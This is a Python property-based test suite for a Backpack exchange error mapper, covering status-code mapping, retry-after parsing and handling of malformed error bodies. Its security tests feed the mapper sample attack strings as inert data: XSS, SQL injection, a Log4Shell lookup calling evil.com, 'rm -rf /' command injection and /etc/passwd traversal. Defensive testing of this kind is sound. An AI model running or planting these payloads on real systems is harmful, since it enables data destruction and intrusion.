"""Property-based tests for Backpack Error Mapping Implementation.

This module provides comprehensive property-based testing of the BackpackErrorMapper class,
which is critical for secure and reliable error handling in trading operations.

SECURITY CRITICAL: Error mapping must correctly translate exchange errors to prevent:
- Incorrect error classification leading to wrong retry strategies
- Security information leakage through error messages
- Rate limiting bypass through improper error handling
- Financial losses due to misclassified trading errors

Key Testing Areas:
- HTTP status code to API error code mapping with comprehensive scenarios
- Backpack-specific error code translation covering all known error types
- Error message extraction and formatting with security considerations
- Retry-after parsing for rate limiting with various time formats
- JSON and non-JSON error body handling with malformed input resistance
- Edge cases and adversarial error responses for security boundaries

Following TESTING_SECURITY_RULES.md:
- NO hardcoded error values (Hypothesis generates them)
- NO fallback mechanisms that could hide critical errors
- Comprehensive testing of error boundary conditions
- Validation of security-sensitive error handling behaviors

Architecture Compliance:
- Follows RULE-ARCH-MODEL-DESIGN-V2 for error model handling
- Implements RULE-RUNTIME-SAFETY-V4 for safe error processing
- Adheres to RULE-NO-SILENCING-V4 for proper error propagation
"""

from __future__ import annotations

import json
from typing import Any

from hypothesis import assume, given, settings, strategies as st
from hypothesis.strategies import SearchStrategy

from cyberdelta.apis.backpack.bp_error_mapper import BackpackErrorMapper
from cyberdelta.apis.common import APIErrorCode


# =============================================================================
# HYPOTHESIS STRATEGIES FOR ERROR MAPPER TESTING
# =============================================================================


def http_status_strategy() -> SearchStrategy[int]:
    """Generate valid HTTP status codes for error mapping testing.

    Returns:
        A Hypothesis strategy for HTTP status codes.
    """
    return st.one_of([
        # Common error status codes
        st.sampled_from([400, 401, 403, 404, 408, 409, 413, 422, 429, 500, 502, 503, 504]),
        # Any valid HTTP error status (4xx and 5xx ranges)
        st.integers(min_value=400, max_value=499),
        st.integers(min_value=500, max_value=599),
    ])


def backpack_error_code_strategy() -> SearchStrategy[str]:
    """Generate Backpack-specific error codes.

    Returns:
        A Hypothesis strategy for Backpack error codes.
    """
    return st.one_of([
        # Known Backpack error codes
        st.sampled_from([
            "INVALID_CLIENT_REQUEST",
            "UNAUTHORIZED",
            "FORBIDDEN",
            "INSUFFICIENT_FUNDS",
            "RESOURCE_NOT_FOUND",
            "TOO_MANY_REQUESTS",
            "RATE_LIMIT_EXCEEDED",
            "SERVER_ERROR",
            "MAINTENANCE",
            "INVALID_SYMBOL",
            "ORDER_NOT_FOUND",
            "MARKET_CLOSED",
            "INSUFFICIENT_LIQUIDITY",
            "INVALID_PRICE",
            "INVALID_QUANTITY",
        ]),
        # Random error codes for unknown error testing
        st.text(
            min_size=3,
            max_size=50,
            alphabet=st.characters(whitelist_categories=["Lu", "Nd"], whitelist_characters="_-"),
        ),
    ])


def error_message_strategy() -> SearchStrategy[str]:
    """Generate realistic error messages.

    Returns:
        A Hypothesis strategy for error messages.
    """
    return st.one_of([
        # Common error messages
        st.sampled_from([
            "Authentication failed",
            "Forbidden access",
            "Account has insufficient balance for requested action.",
            "Order not found or has been filled",
            "Too Many Requests",
            "Internal server error",
            "Service temporarily unavailable",
            "Invalid symbol",
            "Invalid parameter: field=symbol",
            "Generic client error",
            "Bad request",
            "Server Error",
        ]),
        # Generated error messages with common patterns
        st.text(min_size=5, max_size=200),
        # Error messages with retry timing information
        st.builds(
            lambda seconds: f"Retry after {seconds} seconds",
            st.integers(min_value=1, max_value=3600),
        ),
        st.builds(lambda ms: f"Try again in {ms} ms.", st.integers(min_value=100, max_value=60000)),
        st.builds(
            lambda seconds: f"Please wait {seconds}s", st.integers(min_value=1, max_value=300)
        ),
        st.builds(
            lambda seconds: f"Wait {seconds} seconds before retrying",
            st.integers(min_value=1, max_value=600),
        ),
    ])


@st.composite
def json_error_body_strategy(draw: Any) -> str:
    """Generate JSON error body strings.

    Args:
        draw: Hypothesis draw function

    Returns:
        A JSON-formatted error body string.
    """
    message = draw(error_message_strategy())
    code = draw(backpack_error_code_strategy())

    error_data = {
        "message": message,
        "code": code,
    }

    # Sometimes add additional fields
    if draw(st.booleans()):
        additional_fields = draw(
            st.dictionaries(
                st.text(min_size=1, max_size=20),
                st.one_of([st.text(), st.integers(), st.booleans(), st.none()]),
                min_size=0,
                max_size=3,
            )
        )
        error_data.update(additional_fields)

    return json.dumps(error_data)


def non_json_error_body_strategy() -> SearchStrategy[str]:
    """Generate non-JSON error body content.

    Returns:
        A Hypothesis strategy for non-JSON error bodies.
    """
    return st.one_of([
        # Plain text errors
        st.sampled_from([
            "Invalid JSON input",
            "Internal Server Error",
            "Bad Gateway",
            "Service Unavailable",
            "Gateway Timeout",
        ]),
        # HTML error pages
        st.just("<html><body>Server Error</body></html>"),
        st.just(
            "<!DOCTYPE html><html><head><title>Error</title></head><body><h1>404 Not Found</h1></body></html>"
        ),
        # Empty or whitespace
        st.just(""),
        st.just("   "),
        # Random text
        st.text(max_size=1000),
        # Malformed JSON
        st.just('{"incomplete": '),
        st.just('{"message":"error", "code":}'),
    ])


def retry_after_message_strategy() -> SearchStrategy[tuple[str, float | None]]:
    """Generate messages with retry-after timing and expected parsed values.

    Returns:
        A tuple of (message, expected_retry_after_seconds).
    """
    return st.one_of([
        # Valid retry patterns
        st.builds(
            lambda seconds: (f"Retry after {seconds} seconds", float(seconds)),
            st.integers(min_value=1, max_value=3600),
        ),
        st.builds(
            lambda ms: (f"Try again in {ms} ms.", float(ms) / 1000),
            st.integers(min_value=100, max_value=60000),
        ),
        st.builds(
            lambda seconds: (f"Please wait {seconds}s", float(seconds)),
            st.integers(min_value=1, max_value=300),
        ),
        st.builds(
            lambda seconds: (f"Wait {seconds} seconds before retrying", float(seconds)),
            st.integers(min_value=1, max_value=600),
        ),
        st.builds(
            lambda ms: (f"Wait for {ms} milliseconds then try again", float(ms) / 1000),
            st.integers(min_value=100, max_value=60000),
        ),
        # Case variations
        st.builds(
            lambda seconds: (f"RETRY AFTER {seconds} SECONDS", float(seconds)),
            st.integers(min_value=1, max_value=100),
        ),
        # No retry information
        st.just(("Rate limit exceeded.", None)),
        st.just(("Too many requests", None)),
        st.just(("Retry after twenty seconds.", None)),  # Text numbers
    ])


def malicious_error_input_strategy() -> SearchStrategy[Any]:
    """Generate malicious inputs for security testing.

    Returns:
        A Hypothesis strategy for malicious error inputs.
    """
    return st.one_of([
        # XSS attempts in error messages
        st.just('{"message":"<script>alert(\'xss\')</script>","code":"XSS"}'),
        st.just('{"message":"<img src=x onerror=alert(1)>","code":"IMG_XSS"}'),
        # SQL injection attempts
        st.just('{"message":"\'; DROP TABLE users;--","code":"SQL_INJ"}'),
        st.just('{"message":"1\' OR \'1\'=\'1","code":"SQL_INJ"}'),
        # Buffer overflow attempts
        st.text(min_size=1000, max_size=1500),
        st.just('{"message":"' + "A" * 1500 + '","code":"OVERFLOW"}'),
        # JSON bombs
        st.just('{"message":"test","nested":' + '{"a":' * 1000 + '"value"' + "}" * 1000 + "}"),
        # Unicode attacks
        st.just('{"message":"\\udce2\\udc28\\udc00","code":"UNICODE"}'),
        st.just('{"message":"\\x00\\x01\\x02","code":"CTRL_CHARS"}'),
        # Format string attacks
        st.just('{"message":"%s%s%s%s%s%s%s%s%s%s","code":"FMT_STR"}'),
        st.just('{"message":"${jndi:ldap://evil.com/a}","code":"LOG4J"}'),
        # Command injection
        st.just('{"message":"; rm -rf /","code":"CMD_INJ"}'),
        st.just('{"message":"`rm -rf /`","code":"CMD_INJ"}'),
    ])


# =============================================================================
# PROPERTY TESTS FOR ERROR MAPPING
# =============================================================================


class TestBackpackErrorMapperProperties:
    """Property-based tests for BackpackErrorMapper core functionality."""

    @given(
        status_code=http_status_strategy(),
        error_body=json_error_body_strategy(),
    )
    @settings(max_examples=300, deadline=None)
    def test_error_mapping_preserves_http_status(self, status_code: int, error_body: str) -> None:
        """Property: HTTP status code should always be preserved in mapped errors."""
        mapper = BackpackErrorMapper()

        try:
            error_data = json.loads(error_body)
        except json.JSONDecodeError:
            error_data = None

        api_error = mapper.map_exchange_error(status_code, error_body, error_data)

        # Property: HTTP status must be preserved exactly
        assert api_error.http_status == status_code

        # Property: API error code should be valid enum value
        assert api_error.code in [code.value for code in APIErrorCode]  # type: ignore[operator]

        # Property: Message should not be empty for valid inputs
        assert isinstance(api_error.message, str)
        if error_data and "message" in error_data:
            # Should contain original message
            assert error_data["message"] in api_error.message

    @given(
        status_code=st.sampled_from([400, 401, 403, 404, 429, 500, 503]),
        message=error_message_strategy(),
        bp_code=backpack_error_code_strategy(),
    )
    @settings(max_examples=200, deadline=None)
    def test_status_code_mapping_consistency(
        self, status_code: int, message: str, bp_code: str
    ) -> None:
        """Property: Similar status codes should map to consistent API error categories."""
        mapper = BackpackErrorMapper()

        error_body = json.dumps({"message": message, "code": bp_code})
        error_data = {"message": message, "code": bp_code}

        api_error = mapper.map_exchange_error(status_code, error_body, error_data)

        # Property: Status code mapping should be consistent
        if status_code == 400:
            # 400 errors should map to client error codes
            assert api_error.code in [
                APIErrorCode.INVALID_REQUEST.value,
                APIErrorCode.INSUFFICIENT_FUNDS.value,
                APIErrorCode.ORDER_NOT_FOUND.value,
                APIErrorCode.INVALID_SYMBOL.value,
            ]
        elif status_code == 401 or status_code == 403:
            assert api_error.code == APIErrorCode.AUTHENTICATION_FAILED.value
        elif status_code == 429:
            assert api_error.code == APIErrorCode.RATE_LIMITED.value
        elif status_code == 500:
            assert api_error.code == APIErrorCode.SERVER_ERROR.value
        elif status_code == 503:
            assert api_error.code == APIErrorCode.MAINTENANCE.value

    @given(
        known_bp_code=st.sampled_from([
            "INSUFFICIENT_FUNDS",
            "RESOURCE_NOT_FOUND",
            "INVALID_SYMBOL",
            "TOO_MANY_REQUESTS",
            "RATE_LIMIT_EXCEEDED",
        ]),
        message=error_message_strategy(),
        status_code=http_status_strategy(),
    )
    @settings(max_examples=150, deadline=None)
    def test_backpack_error_code_mapping(
        self, known_bp_code: str, message: str, status_code: int
    ) -> None:
        """Property: Known Backpack error codes should map to specific API error codes."""
        mapper = BackpackErrorMapper()

        error_body = json.dumps({"message": message, "code": known_bp_code})
        error_data = {"message": message, "code": known_bp_code}

        api_error = mapper.map_exchange_error(status_code, error_body, error_data)

        # Property: Known codes should map to specific API error codes
        if known_bp_code == "INSUFFICIENT_FUNDS":
            assert api_error.code == APIErrorCode.INSUFFICIENT_FUNDS.value
        elif known_bp_code == "RESOURCE_NOT_FOUND":
            assert api_error.code == APIErrorCode.ORDER_NOT_FOUND.value
        elif known_bp_code == "INVALID_SYMBOL":
            assert api_error.code == APIErrorCode.INVALID_SYMBOL.value
        elif known_bp_code in ["TOO_MANY_REQUESTS", "RATE_LIMIT_EXCEEDED"]:
            assert api_error.code == APIErrorCode.RATE_LIMITED.value

        # Property: Exchange message should be preserved
        assert api_error.exchange_message == message

    @given(
        status_code=http_status_strategy(),
        error_body=non_json_error_body_strategy(),
    )
    @settings(max_examples=200, deadline=None)
    def test_non_json_error_handling(self, status_code: int, error_body: str) -> None:
        """Property: Non-JSON error bodies should be handled gracefully."""
        mapper = BackpackErrorMapper()

        api_error = mapper.map_exchange_error(status_code, error_body, error_data=None)

        # Property: Should not crash on non-JSON input
        assert isinstance(api_error.code, str)
        assert api_error.code in [code.value for code in APIErrorCode]  # type: ignore[operator]

        # Property: HTTP status should be preserved
        assert api_error.http_status == status_code

        # Property: Exchange message should be the raw body
        assert api_error.exchange_message == error_body

        # Property: Should have meaningful error classification
        if status_code >= 500:
            assert api_error.code in [
                APIErrorCode.SERVER_ERROR.value,
                APIErrorCode.MAINTENANCE.value,
                APIErrorCode.EXCHANGE_SPECIFIC.value,
            ]
        elif status_code >= 400:
            assert api_error.code in [
                APIErrorCode.INVALID_REQUEST.value,
                APIErrorCode.AUTHENTICATION_FAILED.value,
                APIErrorCode.EXCHANGE_SPECIFIC.value,
            ]

    @given(
        retry_message_data=retry_after_message_strategy(),
        status_code=st.sampled_from([429, 503]),
    )
    @settings(max_examples=150, deadline=None)
    def test_retry_after_parsing_properties(
        self, retry_message_data: tuple[str, float | None], status_code: int
    ) -> None:
        """Property: Retry-after parsing should correctly extract timing information."""
        message, expected_retry_after = retry_message_data

        mapper = BackpackErrorMapper()

        error_body = json.dumps({"message": message, "code": "TOO_MANY_REQUESTS"})
        error_data = {"message": message, "code": "TOO_MANY_REQUESTS"}

        api_error = mapper.map_exchange_error(status_code, error_body, error_data)

        # Property: Retry after should match expected value
        if expected_retry_after is not None:
            assert api_error.retry_after == expected_retry_after
        else:
            assert api_error.retry_after is None

        # Property: Rate limited errors should have correct code
        if status_code == 429:
            assert api_error.code == APIErrorCode.RATE_LIMITED.value

    @given(
        message=error_message_strategy(),
        unknown_code=st.text(min_size=1, max_size=50).filter(
            lambda x: x
            not in [
                "INSUFFICIENT_FUNDS",
                "RESOURCE_NOT_FOUND",
                "INVALID_SYMBOL",
                "TOO_MANY_REQUESTS",
                "RATE_LIMIT_EXCEEDED",
                "UNAUTHORIZED",
                "FORBIDDEN",
                "SERVER_ERROR",
                "MAINTENANCE",
            ]
        ),
        status_code=http_status_strategy(),
    )
    @settings(max_examples=150, deadline=None)
    def test_unknown_error_code_handling(
        self, message: str, unknown_code: str, status_code: int
    ) -> None:
        """Property: Unknown error codes should be handled with appropriate fallbacks."""
        mapper = BackpackErrorMapper()

        error_body = json.dumps({"message": message, "code": unknown_code})
        error_data = {"message": message, "code": unknown_code}

        api_error = mapper.map_exchange_error(status_code, error_body, error_data)

        # Property: Should have valid API error code (fallback to status-based mapping)
        assert api_error.code in [code.value for code in APIErrorCode]  # type: ignore[operator]

        # Property: Message should be preserved
        assert message in api_error.message

        # Property: Metadata should contain original error data
        assert api_error.metadata == error_data

        # Property: Exchange message should be preserved
        assert api_error.exchange_message == message


# =============================================================================
# PROPERTY TESTS FOR SECURITY BOUNDARIES
# =============================================================================


class TestBackpackErrorMapperSecurityProperties:
    """Property-based tests for security-critical error mapping behavior."""

    @given(
        malicious_input=malicious_error_input_strategy(),
        status_code=http_status_strategy(),
    )
    @settings(max_examples=100, deadline=None)
    def test_malicious_input_resistance(self, malicious_input: Any, status_code: int) -> None:
        """Property: Error mapper should safely handle malicious inputs."""
        mapper = BackpackErrorMapper()

        # Convert malicious input to string if needed
        if isinstance(malicious_input, str):
            error_body = malicious_input
        else:
            error_body = str(malicious_input)

        try:
            error_data = json.loads(error_body) if error_body.strip().startswith("{") else None
        except (json.JSONDecodeError, AttributeError):
            error_data = None

        # Should not crash on malicious input
        api_error = mapper.map_exchange_error(status_code, error_body, error_data)

        # Property: Should return valid error object
        assert isinstance(api_error.code, str)
        assert api_error.code in [str(code.value) for code in APIErrorCode]
        assert api_error.http_status == status_code

        # Property: Should not leak sensitive information
        assert "password" not in api_error.message.lower()
        assert "secret" not in api_error.message.lower()
        assert "key" not in api_error.message.lower()

        # Property: Message length should be reasonable (prevent DoS)
        assert len(api_error.message) <= 10000

    @given(
        error_body=st.text(min_size=0, max_size=1500),
        status_code=http_status_strategy(),
    )
    @settings(max_examples=100, deadline=None)
    def test_large_input_handling(self, error_body: str, status_code: int) -> None:
        """Property: Error mapper should handle large inputs without memory issues."""
        mapper = BackpackErrorMapper()

        try:
            error_data = json.loads(error_body) if error_body.strip() else None
        except json.JSONDecodeError:
            error_data = None

        # Should not crash on large input
        api_error = mapper.map_exchange_error(status_code, error_body, error_data)

        # Property: Should produce reasonable output size
        assert len(api_error.message) <= max(len(error_body), 10000)
        assert api_error.http_status == status_code

    @given(
        nested_json=st.recursive(
            st.none() | st.booleans() | st.text(max_size=50),
            lambda children: st.lists(children, max_size=3)
            | st.dictionaries(st.text(max_size=10), children, max_size=3),
            max_leaves=20,
        ),
        status_code=http_status_strategy(),
    )
    @settings(max_examples=50, deadline=None)
    def test_deeply_nested_json_handling(self, nested_json: Any, status_code: int) -> None:
        """Property: Error mapper should handle deeply nested JSON safely."""
        mapper = BackpackErrorMapper()

        try:
            error_body = json.dumps({"message": "test", "data": nested_json})
            error_data = json.loads(error_body)
        except (TypeError, ValueError, RecursionError):
            # Skip if JSON is too complex to serialize
            assume(False)

        # Should handle nested JSON without stack overflow
        api_error = mapper.map_exchange_error(status_code, error_body, error_data)

        # Property: Should produce valid error
        assert isinstance(api_error.code, str)
        assert api_error.http_status == status_code

    @given(
        field_name=st.sampled_from(["message", "code", "error", "detail", "description"]),
        injection_payload=st.sampled_from([
            "<script>alert('xss')</script>",
            "'; DROP TABLE users;--",
            "${jndi:ldap://evil.com/a}",
            "../../../etc/passwd",
            "%s%s%s%s",
        ]),
        status_code=http_status_strategy(),
    )
    @settings(max_examples=100, deadline=None)
    def test_injection_attack_resistance(
        self, field_name: str, injection_payload: str, status_code: int
    ) -> None:
        """Property: Error mapper should resist various injection attacks."""
        mapper = BackpackErrorMapper()

        error_data = {field_name: injection_payload, "code": "TEST_ERROR"}
        error_body = json.dumps(error_data)

        api_error = mapper.map_exchange_error(status_code, error_body, error_data)

        # Property: Should not execute or interpret malicious content
        assert api_error.http_status == status_code
        assert isinstance(api_error.message, str)

        # Property: Should contain the payload as text, not execute it
        if field_name == "message":
            assert injection_payload in api_error.message


# =============================================================================
# PROPERTY TESTS FOR RETRY LOGIC
# =============================================================================


class TestRetryAfterParsingProperties:
    """Property-based tests for retry-after parsing logic."""

    @given(
        seconds=st.integers(min_value=1, max_value=3600),
        pattern=st.sampled_from([
            "Retry after {} seconds",
            "retry after {} seconds",
            "RETRY AFTER {} SECONDS",
            "Please wait {}s",
            "Wait {} seconds before retrying",
            "wait {} second",  # singular
            "Wait for {} secs",
        ]),
    )
    @settings(max_examples=150, deadline=None)
    def test_seconds_parsing_patterns(self, seconds: int, pattern: str) -> None:
        """Property: Various second patterns should parse correctly."""
        mapper = BackpackErrorMapper()
        message = pattern.format(seconds)

        error_body = json.dumps({"message": message, "code": "TOO_MANY_REQUESTS"})
        error_data = {"message": message, "code": "TOO_MANY_REQUESTS"}

        api_error = mapper.map_exchange_error(429, error_body, error_data)

        # Property: Should parse seconds correctly
        assert api_error.retry_after == float(seconds)

    @given(
        milliseconds=st.integers(min_value=100, max_value=60000),
        pattern=st.sampled_from([
            "Try again in {} ms.",
            "try again in {} ms",
            "Wait for {} milliseconds then try again",
            "wait {} milliseconds",
            "Retry in {} ms",
        ]),
    )
    @settings(max_examples=150, deadline=None)
    def test_milliseconds_parsing_patterns(self, milliseconds: int, pattern: str) -> None:
        """Property: Various millisecond patterns should parse correctly."""
        mapper = BackpackErrorMapper()
        message = pattern.format(milliseconds)

        error_body = json.dumps({"message": message, "code": "TOO_MANY_REQUESTS"})
        error_data = {"message": message, "code": "TOO_MANY_REQUESTS"}

        api_error = mapper.map_exchange_error(429, error_body, error_data)

        # Property: Should convert milliseconds to seconds
        expected_seconds = float(milliseconds) / 1000
        assert api_error.retry_after == expected_seconds

    @given(
        message=st.text(min_size=5, max_size=200).filter(
            lambda x: not any(
                pattern in x.lower()
                for pattern in ["second", "ms", "millisecond", "minute", "hour"]
            )
        ),
    )
    @settings(max_examples=100, deadline=None)
    def test_no_retry_info_parsing(self, message: str) -> None:
        """Property: Messages without retry info should return None."""
        mapper = BackpackErrorMapper()

        error_body = json.dumps({"message": message, "code": "TOO_MANY_REQUESTS"})
        error_data = {"message": message, "code": "TOO_MANY_REQUESTS"}

        api_error = mapper.map_exchange_error(429, error_body, error_data)

        # Property: Should not extract retry timing from unrelated text
        assert api_error.retry_after is None

    @given(
        time_value=st.floats(min_value=0.1, max_value=3600.0),
        corrupted_pattern=st.sampled_from([
            "Retry after {:.2f} second",  # Float instead of int
            "Wait {:.1f}s then retry",
            "Retry in {:.3f} ms",  # Float milliseconds
        ]),
    )
    @settings(max_examples=100, deadline=None)
    def test_float_time_parsing(self, time_value: float, corrupted_pattern: str) -> None:
        """Property: Float time values should be parsed when possible."""
        mapper = BackpackErrorMapper()

        if "ms" in corrupted_pattern:
            message = corrupted_pattern.format(time_value * 1000)  # Convert to ms
            expected_retry = time_value
        else:
            message = corrupted_pattern.format(time_value)
            expected_retry = time_value

        error_body = json.dumps({"message": message, "code": "TOO_MANY_REQUESTS"})
        error_data = {"message": message, "code": "TOO_MANY_REQUESTS"}

        api_error = mapper.map_exchange_error(429, error_body, error_data)

        # Property: Should parse float values correctly (within tolerance)
        if api_error.retry_after is not None:
            assert abs(api_error.retry_after - expected_retry) < 0.1


# =============================================================================
# INTEGRATION PROPERTY TESTS
# =============================================================================


class TestBackpackErrorMapperIntegrationProperties:
    """Integration property tests for complete error mapping workflows."""

    @given(
        status_code=http_status_strategy(),
        bp_code=backpack_error_code_strategy(),
        message=error_message_strategy(),
    )
    @settings(max_examples=200, deadline=None)
    def test_complete_error_mapping_workflow(
        self, status_code: int, bp_code: str, message: str
    ) -> None:
        """Property: Complete error mapping should preserve all essential information."""
        mapper = BackpackErrorMapper()

        error_data = {"message": message, "code": bp_code}
        error_body = json.dumps(error_data)

        api_error = mapper.map_exchange_error(status_code, error_body, error_data)

        # Property: All essential information should be preserved
        assert api_error.http_status == status_code
        assert api_error.exchange_message == message
        assert api_error.metadata == error_data

        # Property: API error code should be valid
        assert api_error.code in [code.value for code in APIErrorCode]  # type: ignore[operator]

        # Property: Message should contain original information
        assert message in api_error.message

        # Property: Should be serializable for logging
        error_dict = {
            "code": api_error.code,
            "message": api_error.message,
            "http_status": api_error.http_status,
            "exchange_message": api_error.exchange_message,
            "retry_after": api_error.retry_after,
        }
        # Should not raise exception
        json.dumps(error_dict, default=str)

    @given(
        error_scenarios=st.lists(
            st.tuples(
                http_status_strategy(),
                json_error_body_strategy(),
            ),
            min_size=1,
            max_size=10,
        )
    )
    @settings(max_examples=50, deadline=None)
    def test_batch_error_mapping_consistency(self, error_scenarios: list[tuple[int, str]]) -> None:
        """Property: Batch error mapping should be consistent across multiple calls."""
        mapper = BackpackErrorMapper()

        # Map all errors
        results = []
        for status_code, error_body in error_scenarios:
            try:
                error_data = json.loads(error_body)
            except json.JSONDecodeError:
                error_data = None

            api_error = mapper.map_exchange_error(status_code, error_body, error_data)
            results.append(api_error)

        # Property: All results should be valid
        for api_error in results:
            assert api_error.code in [code.value for code in APIErrorCode]  # type: ignore[operator]
            assert isinstance(api_error.http_status, int)
            assert isinstance(api_error.message, str)

        # Property: Same input should produce same output (deterministic)
        for (status_code, error_body), original_result in zip(
            error_scenarios, results, strict=False
        ):
            try:
                error_data = json.loads(error_body)
            except json.JSONDecodeError:
                error_data = None

            repeated_result = mapper.map_exchange_error(status_code, error_body, error_data)

            assert repeated_result.code == original_result.code
            assert repeated_result.http_status == original_result.http_status
            assert repeated_result.message == original_result.message
            assert repeated_result.retry_after == original_result.retry_after


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_backpack_error_mapper_known_error_mapping() -> None:
    """Test known error mappings for regression verification."""
    mapper = BackpackErrorMapper()

    # Test INSUFFICIENT_FUNDS mapping
    error_data = {"message": "Account has insufficient balance", "code": "INSUFFICIENT_FUNDS"}
    api_error = mapper.map_exchange_error(400, json.dumps(error_data), error_data)
    assert api_error.code == APIErrorCode.INSUFFICIENT_FUNDS.value

    # Test authentication error
    error_data = {"message": "Authentication failed", "code": "UNAUTHORIZED"}
    api_error = mapper.map_exchange_error(401, json.dumps(error_data), error_data)
    assert api_error.code == APIErrorCode.AUTHENTICATION_FAILED.value

    # Test rate limiting
    error_data = {"message": "Too Many Requests", "code": "TOO_MANY_REQUESTS"}
    api_error = mapper.map_exchange_error(429, json.dumps(error_data), error_data)
    assert api_error.code == APIErrorCode.RATE_LIMITED.value


def test_backpack_error_mapper_retry_after_compatibility() -> None:
    """Test retry-after parsing for known formats."""
    mapper = BackpackErrorMapper()

    # Test seconds parsing
    error_data = {"message": "Retry after 30 seconds", "code": "TOO_MANY_REQUESTS"}
    api_error = mapper.map_exchange_error(429, json.dumps(error_data), error_data)
    assert api_error.retry_after == 30.0

    # Test milliseconds parsing
    error_data = {"message": "Try again in 1500 ms.", "code": "TOO_MANY_REQUESTS"}
    api_error = mapper.map_exchange_error(429, json.dumps(error_data), error_data)
    assert api_error.retry_after == 1.5

    # Test no retry info
    error_data = {"message": "Rate limit exceeded.", "code": "TOO_MANY_REQUESTS"}
    api_error = mapper.map_exchange_error(429, json.dumps(error_data), error_data)
    assert api_error.retry_after is None


def test_backpack_error_mapper_empty_input_handling() -> None:
    """Test handling of empty and malformed inputs."""
    mapper = BackpackErrorMapper()

    # Empty error body
    api_error = mapper.map_exchange_error(500, "", error_data=None)
    assert api_error.code == APIErrorCode.EXCHANGE_SPECIFIC.value
    assert api_error.http_status == 500

    # Non-JSON error body
    api_error = mapper.map_exchange_error(400, "Invalid JSON input", error_data=None)
    assert api_error.code == APIErrorCode.INVALID_REQUEST.value
    assert "Invalid JSON input" in api_error.message
